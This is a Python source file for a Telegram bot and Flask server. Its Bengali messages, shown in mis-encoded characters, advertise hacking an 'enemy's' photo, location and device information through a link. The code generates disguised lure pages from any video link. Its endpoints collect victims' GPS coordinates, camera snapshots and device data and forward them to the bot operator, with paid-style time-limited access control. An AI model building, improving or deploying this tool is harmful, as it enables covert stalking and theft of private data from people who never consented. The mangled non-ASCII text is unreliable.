import os
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from flask import Flask, request, render_template
import base64
import json
from threading import Thread
import time
import urllib.parse
from PIL import Image
import io

# ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶ü ‡¶ü‡ßã‡¶ï‡ßá‡¶® ‡¶è‡¶¨‡¶Ç ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡¶Æ‡¶ø‡¶®‡ßá‡¶∞ ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶Ü‡¶á‡¶°‡¶ø ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶¶‡¶ø‡¶®
TELEGRAM_BOT_TOKEN = os.environ.get("bot")
OWNER_ID = 6246410156

# ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶π‡ßã‡¶∏‡ßç‡¶ü‡¶ø‡¶Ç URL ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶¶‡¶ø‡¶®
HOST_URL = "https://your-app-name.onrender.com"

# ‡¶Ö‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡¶ï‡¶æ‡¶∞‡ßÄ‡¶¶‡ßá‡¶∞ ‡¶´‡¶æ‡¶á‡¶≤
USERS_FILE = 'users.json'
allowed_users = {}
start_time = time.time()

# ‡¶≤‡¶ó‡¶ø‡¶Ç ‡¶∏‡ßá‡¶ü‡¶Ü‡¶™
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ‡¶Ö‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡¶ï‡¶æ‡¶∞‡ßÄ‡¶¶‡ßá‡¶∞ ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ ‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡¶æ
def load_allowed_users():
    global allowed_users
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            allowed_users = json.load(f)
    else:
        allowed_users[str(OWNER_ID)] = {'expires': 'forever'}
        save_allowed_users()

# ‡¶Ö‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡¶ï‡¶æ‡¶∞‡ßÄ‡¶¶‡ßá‡¶∞ ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡¶æ
def save_allowed_users():
    with open(USERS_FILE, 'w') as f:
        json.dump(allowed_users, f, indent=4)

# ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶Ö‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶ï‡¶ø‡¶®‡¶æ ‡¶§‡¶æ ‡¶Ø‡¶æ‡¶ö‡¶æ‡¶á ‡¶ï‡¶∞‡¶æ
def is_allowed(user_id):
    user_id = str(user_id)
    if user_id == str(OWNER_ID):
        return True
    user = allowed_users.get(user_id)
    if not user:
        return False
    if user['expires'] == 'forever':
        return True
    return time.time() < float(user['expires'])

# ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶¨‡¶ü ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶°‡¶ó‡ßÅ‡¶≤‡ßã
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_allowed(update.effective_user.id):
        await update.message.reply_text("‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶è‡¶á ‡¶¨‡¶ü‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶®‡ßá‡¶á‡•§")
        return
    await update.message.reply_text("‡¶Ü‡¶∏‡¶∏‡¶æ‡¶≤‡¶æ‡¶Æ‡ßÅ ‡¶Ü‡¶≤‡¶æ‡¶á‡¶ï‡ßÅ‡¶Æ! ‡¶Ü‡¶™‡¶®‡¶ø ‡¶è‡¶á ‡¶¨‡¶ü ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßá ‡¶∏‡¶æ‡¶Æ‡¶æ‡¶®‡ßç‡¶Ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶™‡¶æ‡¶†‡¶ø‡¶Ø‡¶º‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶∂‡¶§‡ßç‡¶∞‡ßÅ‡¶∞ ‡¶õ‡¶¨‡¶ø, ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶è‡¶¨‡¶Ç ‡¶§‡¶æ‡¶∞ ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏‡ßá‡¶∞ ‡¶¨‡¶ø‡¶≠‡¶ø‡¶®‡ßç‡¶® ‡¶§‡¶•‡ßç‡¶Ø ‡¶π‡ßç‡¶Ø‡¶æ‡¶ï ‡¶ï‡¶∞‡ßá ‡¶®‡¶ø‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡¶¨‡ßá‡¶®‡•§")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_allowed(update.effective_user.id):
        return
    await update.message.reply_text("‡¶è‡¶á ‡¶¨‡¶ü‡ßá‡¶∞ ‡¶Æ‡¶æ‡¶ß‡ßç‡¶Ø‡¶Æ‡ßá ‡¶Ü‡¶™‡¶®‡¶ø ‡¶ï‡ßá‡¶¨‡¶≤ ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∏‡¶π‡¶ú ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶™‡¶æ‡¶†‡¶ø‡¶Ø‡¶º‡ßá ‡¶Æ‡¶æ‡¶®‡ßÅ‡¶∑‡¶¶‡ßá‡¶∞ ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡¶¨‡ßá‡¶®‡•§\n\n‡¶™‡ßç‡¶∞‡¶•‡¶Æ‡ßá /create ‡¶≤‡¶ø‡¶ñ‡ßá ‡¶∏‡ßá‡¶®‡ßç‡¶° ‡¶ï‡¶∞‡ßÅ‡¶®, ‡¶§‡¶æ‡¶∞‡¶™‡¶∞ ‡¶¨‡¶ü ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ï‡¶æ‡¶õ‡ßá ‡¶è‡¶ï‡¶ü‡¶æ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶ö‡¶æ‡¶á‡¶¨‡ßá, ‡¶Ü‡¶Æ‡¶ø ‡¶Ø‡ßá‡¶ï‡ßá‡¶®‡ßã ‡¶è‡¶ï‡¶ü‡¶æ ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶è‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶¶‡¶ø‡¶Ø‡¶º‡ßá ‡¶¶‡¶ø‡¶¨‡ßá‡¶®‡•§\n‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶•‡ßá‡¶ï‡ßá ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶™‡ßá‡¶≤‡ßá ‡¶¨‡¶ü ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡ßá ‡¶Æ‡ßç‡¶Ø‡¶æ‡¶≤‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞ ‡¶¨‡¶∏‡¶ø‡¶Ø‡¶º‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶ï‡ßá ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡ß® ‡¶ü‡¶æ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶¶‡¶ø‡¶¨‡ßá‡•§")

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_allowed(update.effective_user.id):
        return
    await update.message.reply_text("üåê ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ü‡¶ø ‡¶¶‡¶ø‡¶®")

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_allowed(update.effective_user.id):
        return
    user_link = update.message.text
    if user_link.startswith(('http://', 'https://')):
        encoded_link = base64.b64encode(user_link.encode('utf-8')).decode('utf-8')
        user_id_encoded = base64.b64encode(str(update.effective_user.id).encode('utf-8')).decode('utf-8')
        
        c_url = f"{HOST_URL}/c/{user_id_encoded}/{encoded_link}"
        w_url = f"{HOST_URL}/w/{user_id_encoded}/{encoded_link}"
        
        message_text = f"‡¶®‡¶§‡ßÅ‡¶® ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ó‡ßÅ‡¶≤‡¶ø ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§\nURL: {user_link}\n\n‚úÖ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ó‡ßÅ‡¶≤‡ßã\n\nüåê CloudFlare Page Link\n{c_url}\n\nüåê WebView Page Link\n{w_url}"
        
        await update.message.reply_text(message_text)

    else:
        await update.message.reply_text("‚ö†Ô∏è ‡¶¶‡¶Ø‡¶º‡¶æ ‡¶ï‡¶∞‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∏‡¶†‡¶ø‡¶ï ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶¶‡¶ø‡¶® , ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡ßá ‡¶Ö‡¶¨‡¶∂‡ßç‡¶Ø‡¶á http ‡¶Ö‡¶•‡¶¨‡¶æ https ‡¶•‡¶æ‡¶ï‡¶§‡ßá ‡¶π‡¶¨‡ßá‡•§")


async def allow_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶∂‡ßÅ‡¶ß‡ßÅ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶¨‡¶ü‡ßá‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡¶Æ‡¶ø‡¶® ‡¶è‡¶á ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶°‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶®‡•§")
        return

    try:
        user_id_to_add = context.args[0]
        duration_str = context.args[1] if len(context.args) > 1 else 'forever'
        
        expires_at = 'forever'
        if duration_str != 'forever':
            value = int(duration_str[:-1])
            unit = duration_str[-1].lower()
            if unit == 'm':
                expires_at = time.time() + value * 60
            elif unit == 'h':
                expires_at = time.time() + value * 3600
            elif unit == 'd':
                expires_at = time.time() + value * 3600 * 24
            else:
                await update.message.reply_text("‡¶∏‡¶†‡¶ø‡¶ï ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü: /allow <user_id> [‡¶∏‡¶Æ‡¶Ø‡¶º (‡¶Ø‡ßá‡¶Æ‡¶®: 30m, 2h, 7d)]")
                return

        allowed_users[user_id_to_add] = {'expires': expires_at}
        save_allowed_users()
        await update.message.reply_text(f"‡¶á‡¶â‡¶ú‡¶æ‡¶∞ {user_id_to_add} ‡¶ï‡ßá ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶¶‡ßá‡¶ì‡¶Ø‡¶º‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§")

    except (IndexError, ValueError):
        await update.message.reply_text("‡¶∏‡¶†‡¶ø‡¶ï ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü: /allow <user_id> [‡¶∏‡¶Æ‡¶Ø‡¶º]")

async def disallow_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶∂‡ßÅ‡¶ß‡ßÅ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶¨‡¶ü‡ßá‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡¶Æ‡¶ø‡¶® ‡¶è‡¶á ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶°‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶®‡•§")
        return
    try:
        user_id_to_remove = context.args[0]
        if user_id_to_remove in allowed_users:
            del allowed_users[user_id_to_remove]
            save_allowed_users()
            await update.message.reply_text(f"‡¶á‡¶â‡¶ú‡¶æ‡¶∞ {user_id_to_remove} ‡¶ï‡ßá ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ ‡¶•‡ßá‡¶ï‡ßá ‡¶∏‡¶∞‡¶æ‡¶®‡ßã ‡¶π‡ßü‡ßá‡¶õ‡ßá‡•§")
        else:
            await update.message.reply_text("‡¶è‡¶á ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶Ö‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ‡ßü ‡¶®‡ßá‡¶á‡•§")
    except (IndexError, ValueError):
        await update.message.reply_text("‡¶∏‡¶†‡¶ø‡¶ï ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü: /disallow <user_id>")

async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uptime_seconds = time.time() - start_time
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await update.message.reply_text(f"‡¶¨‡¶ü‡¶ü‡¶ø ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶Ü‡¶õ‡ßá {int(hours)} ‡¶ò‡¶®‡ßç‡¶ü‡¶æ, {int(minutes)} ‡¶Æ‡¶ø‡¶®‡¶ø‡¶ü, ‡¶è‡¶¨‡¶Ç {int(seconds)} ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶° ‡¶ß‡¶∞‡ßá‡•§")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "crenew":
        await create_command(query, context)

# ‡¶´‡ßç‡¶≤‡¶æ‡¶∏‡ßç‡¶ï ‡¶ì‡ßü‡ßá‡¶¨ ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶∏‡ßá‡¶ü‡¶Ü‡¶™
app = Flask(__name__)

@app.route('/c/<path:path>/<path:uri>')
def cloudflare_page(path, uri):
    uid = base64.b64decode(path).decode('utf-8')
    url = base64.b64decode(uri).decode('utf-8')
    return render_template('cloudflare.html', uid=uid, url=url, a=HOST_URL)

@app.route('/w/<path:path>/<path:uri>')
def webview_page(path, uri):
    uid = base64.b64decode(path).decode('utf-8')
    url = base64.b64decode(uri).decode('utf-8')
    return render_template('webview.html', uid=uid, url=url, a=HOST_URL)

@app.route('/location', methods=['POST'])
def location():
    try:
        data = request.json
        uid = data.get('uid')
        lat = data.get('lat')
        lon = data.get('lon')
        acc = data.get('acc')
        
        user_id = base64.b64decode(uid).decode('utf-8')
        
        application.bot.send_location(chat_id=user_id, latitude=lat, longitude=lon)
        application.bot.send_message(chat_id=user_id, text=f"Latitude: {lat}\nLongitude: {lon}\nAccuracy: {acc} meters")
        
        return "Done", 200
    except Exception as e:
        logger.error(f"Location error: {e}")
        return "Error", 500

@app.route('/camsnap', methods=['POST'])
def camsnap():
    try:
        data = request.json
        uid = data.get('uid')
        img_base64 = data.get('img')

        if not uid or not img_base64:
            return "No data", 400

        user_id = base64.b64decode(uid).decode('utf-8')
        
        image_data = base64.b64decode(img_base64)
        
        application.bot.send_photo(chat_id=user_id, photo=io.BytesIO(image_data))

        return "Done", 200

    except Exception as e:
        logger.error(f"Error processing image: {e}")
        application.bot.send_message(chat_id=user_id, text="‚ö†Ô∏è ‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶õ‡¶¨‡¶ø ‡¶™‡ßç‡¶∞‡¶∏‡ßá‡¶∏ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶∏‡¶Æ‡ßü ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá‡•§")
        return "Error", 500
        
@app.route('/', methods=['POST'])
def post_data():
    try:
        data = request.json
        uid = data.get('uid')
        victim_data = data.get('data')

        user_id = base64.b64decode(uid).decode('utf-8')
        
        application.bot.send_message(chat_id=user_id, text=victim_data)
        return "Done", 200
    except Exception as e:
        logger.error(f"Error posting data: {e}")
        return "Error", 500

# ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶¨‡¶ü ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡¶æ
def run_telegram_bot():
    load_allowed_users()
    global application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("create", create_command))
    application.add_handler(CommandHandler("allow", allow_user))
    application.add_handler(CommandHandler("disallow", disallow_user))
    application.add_handler(CommandHandler("uptime", uptime))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
    application.add_handler(CallbackQueryHandler(button_handler))

    application.run_polling()

# ‡¶¶‡ßÅ‡¶ü‡¶ø ‡¶•‡ßç‡¶∞‡ßá‡¶°‡ßá ‡¶¨‡¶ü ‡¶è‡¶¨‡¶Ç ‡¶ì‡ßü‡ßá‡¶¨ ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞ ‡¶ö‡¶æ‡¶≤‡¶æ‡¶®‡ßã
if __name__ == "__main__":
    bot_thread = Thread(target=run_telegram_bot)
    bot_thread.start()

    app.run(port=5000)